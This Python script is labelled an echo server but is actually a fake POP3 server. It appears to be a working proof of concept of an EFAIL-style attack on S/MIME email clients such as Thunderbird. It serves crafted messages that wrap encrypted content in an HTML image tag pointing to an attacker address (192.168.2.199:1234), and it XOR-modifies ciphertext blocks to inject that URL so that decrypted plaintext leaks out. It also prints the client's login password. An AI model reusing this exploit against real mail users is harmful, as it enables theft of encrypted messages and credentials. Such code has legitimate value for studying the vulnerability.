# Echo server program
import socket




def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    err, ret = recvall(self._sock, n)
    if err != OK:
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

  def sendall(self, txt):
    print txt
    return self._sock.sendall(txt)

s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', 1110))
s.listen(1)
conn, addr = s.accept()
print 'Connected by', addr
s.close()

s._sock = conn # Don't do this at home.

s.sendall('+OK Whatever <something@somewhere>\n')


msg2 = ["""To: tester@example.com
From: Sender <sender@example.com>
Subject: asdf2
Message-ID: <c969ec75-b99e-a746-58a1-e38dbb8410da@example.com>
Date: Wed, 13 Jun 2018 20:37:28 +0200
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101
 Thunderbird/54.0
MIME-Version: 1.0
Content-Type: multipart/mixed;boundary="ASDFASDF"

--ASDFASDF
Content-Type: text/html

<img src='http://192.168.2.199:1234/
--ASDFASDF
Content-Type: application/pkcs7-mime; smime-type=enveloped-data
Content-Transfer-Encoding: base64

MIAGCSqGSIb3DQEHA6CAMIACAQAxggTjMIICYgIBADBKMEUxCzAJBgNVBAYTAlBMMRMwEQYD
VQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQCAQEw
DQYJKoZIhvcNAQEBBQAEggIAqKAF0y+R/efJJswuUtNouUveXevUpI7IWLkYbZBxTejf17hO
+hanilsyyiWdIzTPTvJCflhwhXFJfnMVPtMPjj4L2y0geAYa+mbAHQksuApBf1dQMNtuf99S
K3iyA4T4LW4kxx/YV9JFLvjT2Z74lZC4b5VsbuL0FN52L9RCbGodhEv2VWhrGz3gQOKQmPk2
pERS5VExiROYMp8KhF6xbfjYfQicVI7DAlRiIigmXOUq41VTAuVVkHse+S4FSPDscM22GEIn
ehMgJNzEaMK4UVtGMkQJwttROeSqIcopgDZdhRxuNhXNB6+BEwqUazI0fk7MFKVqHOuroQpo
UTaHGWwUoiMLLp+vR23LDLpfam4ffpcHGXEZRMFJkYx0K5X5+tXu9LEIhCLb1Nga6Lge+4pQ
zsH3gtQPO1mPmIW3DTRQshTcA+cXBsX8EMEnZaHsg+sEqftlvf7VAKR2FY/L/1Tvrw9IkX+Y
3fMZR8iz9ttqydthkIxmdw75Eh8dkWTPlKnygi/SHfNOkbtNgYl7e43OqAhUCrrIhqxbUps+
DDjDALgyhAydIEr8S8UGrKa8z9CYZQ31XyQTZshHO55ZYc+yT1ktSpwMlhFJSsNGqc7icjqS
BJqWyEkltpQjPdq/wmvaIipogilHPsykj+KlnsZGDNwtWEX7AQwJACzUrCQwggJ5AgEAMGEw
XDELMAkGA1UEBhMCQ0gxDzANBgNVBAgMBlp1cmljaDEMMAoGA1UEBwwDWWVzMQ0wCwYDVQQK
DARBc2RmMQwwCgYDVQQLDANZZXMxETAPBgNVBAMMCFdoYXRldmVyAgEBMA0GCSqGSIb3DQEB
AQUABIICAJMRis6Hz+MHmqNGINQq6kmIDqOaA2pqoKNva9LkYJ2/KenGzBorbAu+dhNc+/5e
2psHmU3REBhBGWM14H9OraXGM1lcZsqgsiZbRirgX8L33KC0l9bFqNwaVh+W9c3E5b+f/9v/
yu6Fbm1q+BA2gxJLqAU6y4h0IoS1wOKHoj5dM1cIpewVyBYEP7MLexAJl5U/7kg0nw/aXuRg
xJcJrbodA9ONGojg4iUUb7x/5NLBRJq+y0BvvzyI9p5SMUylYpg9re0/lvWPNCZQSbbRhjXo
SNwH8X5SsE9LvaNqeEmOMmq4uQfIZCmxfiuEXTPeY9yf7IcZLyk0jU9BKEpZ8sX3f+kTDEjw
DoF+8Xa1rqRhAknWVYQEltGvtQSE3ux/TwTRTm8ibTBYVGaLRWnrLvEFNkf8/fl6+1MEa41n
WAN6SFt/XNzdn7DT07ryr3fEvM3SGgMall+mwjeccNFeOceUOfQSHE1j68QIvsx/KJvpLCDl
5DKc8/yWFivr1rmE86pJ5D0SrU1Ek6Pt1P/P2uRXfQNO4a3oGysVXdojOfKNs1p85b5M37jT
2nrp8AxKih8qYJ8QeB+eNp8DujIzqxJQafr4/SMfsNyJEwJtvh9d1XMfsWKaqd86TW+J/ZfT
sqBdWHgFuyXjd/CBVM2dSXvUqn8Sdizo386mbEda+nnPMIAGCSqGSIb3DQEHATAUBggqhkiG
9w0DBwQIc0ukDkiQGRWggASBkPs8ipIHGXC/NYrCEvFUXc73CmEamaueQHKjDXGmYkg4z4h/
NlSUcRsbRvVg2FQoK6qdvPBw7vtYRPP5N8Zh/vHtfzgtCes/UzIxo+wZAqdcPlXDDPx569yt
U/w9w33VUhOgXMaQwH3LJZNoP/FdYJrM3aIjp/csJwrPj5dDKq/3RqfLmOyXZU3Km6KQs4cX
hQQIm2QRxxJvEiMAAAAAAAAAAAAA
--ASDFASDF
Content-Type: text/html

'>
--ASDFASDF--
"""]

data = bytearray("""
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
""".decode('base64'))

dst = (1312 + 3 + 224) - 32
src = (1312 + 3 + 224) - 88

def xor(a, b):
  a = bytearray(a)
  b = bytearray(b)
  for i in range(8):
    a[i] ^= b[i]
  return a

org = data[dst-8:dst+16-8]
data[dst-8:dst+16-8] = xor(org, xor("8.2.199:", "GYNVAEL!"))
#data[dst] ^= 0x24

msg = ["""To: tester@example.com
From: Sender <sender@example.com>
Subject: secret stuff
Message-ID: <f9b9a61e-3c8b-2872-5646-33bd2da4099a@example.com>
Date: Wed, 13 Jun 2018 21:19:45 +0200
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101
 Thunderbird/54.0
MIME-Version: 1.0
Content-Type: application/pkcs7-mime; name="smime.p7m"; smime-type=envelo
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="smime.p7m"
Content-Description: S/MIME Encrypted Message

%s
.
""" % str(data).encode("base64")
]


while True:
  r = s.recvuntil('\n')
  if type(r) is bool:
    print "C: disconnected"
    break
  print "C:", r

  if r.startswith("STAT"):
    k = sum([len(m) for m in msg])
    s.sendall(
"""+OK %i %i
""" % (len(msg), k))
    continue

  if r.startswith("LIST"):
    k = '\n'.join([
        "%i %i" % (i+1, len(m)) for i, m in enumerate(msg)
    ])

    s.sendall(
"""+OK Messages
%s
.
""" % k)
    continue

  if r.startswith("RETR"):
    n = int(r.split(" ")[1].strip()) - 1
    s.sendall(
"""+OK
%s
.
""" % msg[n])
    continue

  if r.startswith("DELE"):
    # Actually do nothing.
    #n = int(r.split(" ")[1].strip()) - 1
    #del msg[n]
    s.sendall(
"""+OK
""")
    continue


  if r.startswith("AUTH PLAIN"):
    s.sendall("+\n")
    p = s.recvuntil('\n')
    print "pass:", p.decode('base64')
    s.sendall(
"""+OK
""")
    continue

  if r.startswith("AUTH"):
    s.sendall(
"""+OK
PLAIN
.
""")
    continue

  if r.startswith("QUIT"):
    s.sendall(
"""+OK Bye
""")
    break

  if r.startswith("UIDL"):
    s.sendall(
"""-ERR What
""")
    continue

  if r.startswith("XTND"):
    s.sendall(
"""-ERR What
""")
    continue

  if r.startswith("CAPA"):
    s.sendall(
"""+OK Capability list follows
.
""")
    continue


  print "-- unhandled"
  break

s.shutdown(socket.SHUT_RDWR)
s.close()
